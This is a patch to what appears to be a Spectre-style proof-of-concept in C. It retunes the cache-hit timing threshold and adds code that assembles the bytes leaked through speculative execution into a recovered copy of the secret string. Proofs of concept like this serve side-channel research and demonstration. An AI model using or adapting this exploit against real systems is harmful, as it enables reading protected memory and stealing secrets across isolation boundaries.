@@ -49,6 +49,7 @@ libflush_session_t* libflush_session;
 #endif
 
 #define MAX_TRIES 2500 /* default was 999 in original code */
+#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /********************************************************************
 Victim code.
@@ -213,18 +214,17 @@ uint64_t read_cycles()
 #define NANOSECONDS_PER_SECOND 1000000000L
 uint64_t read_cycles()
 {
-  int result;
   struct timespec tp;
   clockid_t clk_id = CLOCK_REALTIME;
 
-  result = clock_gettime(clk_id, &tp);
+  clock_gettime(clk_id, &tp);
   /*printf("tp.tv_sec : %ld\n", tp.tv_sec); 
     printf("tp.tv_nsec: %ld\n", tp.tv_nsec); */ 
   return (uint64_t)  ((tp.tv_sec * NANOSECONDS_PER_SECOND) + tp.tv_nsec);
 }
 #endif
 
-#define CACHE_HIT_THRESHOLD (420) /* assume cache hit if time <= threshold */
+
 
 #ifdef TIMING_LIBFLUSH
 uint64_t read_cycles()
@@ -330,6 +330,11 @@ int main(void)
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
 	int score[2], len = strlen(secret);
 	uint8_t value[2];
+	char recovered[len+1];
+	char value_normalised[2];
+	int i = 0;
+
+	memset(recovered, 0x00, len+1);
 
 #ifdef TIMING_LIBFLUSH
 	if (libflush_init(&libflush_session, NULL) == false) {
@@ -364,14 +369,29 @@ int main(void)
 	  printf("Reading at malicious_x = %p ", (void *)malicious_x);
 	  readMemoryByte(malicious_x++, value, score);
 	  printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+	  
+	  value_normalised[0] = (value[0] > 31 && value[0] < 127) ? value[0] : '?';
+	  value_normalised[1] = (value[1] > 31 && value[1] < 127) ? value[1] : '?';
+
 	  printf("0x%02X='%c' score=%d ", value[0],
 		 (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+	  
 	  if (score[1] > 0)
 	    printf("(second best: 0x%02X='%c' score=%d)", value[1],
 		   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
 		   score[1]);
+
+	  if (value_normalised[0] == '?' && value_normalised[1] != '?') {
+	    recovered[i] = value_normalised[1];
+	  } else {
+	    recovered[i] = value_normalised[0];
+	  }
 	  printf("\n");
+	  i++;
 	}
+
+	printf("Original secret: %s\n", secret);
+	printf("Recovered      : %s\n", recovered);
 
 #ifdef TIMING_LIBFLUSH
 	if (libflush_terminate(libflush_session) == false) {
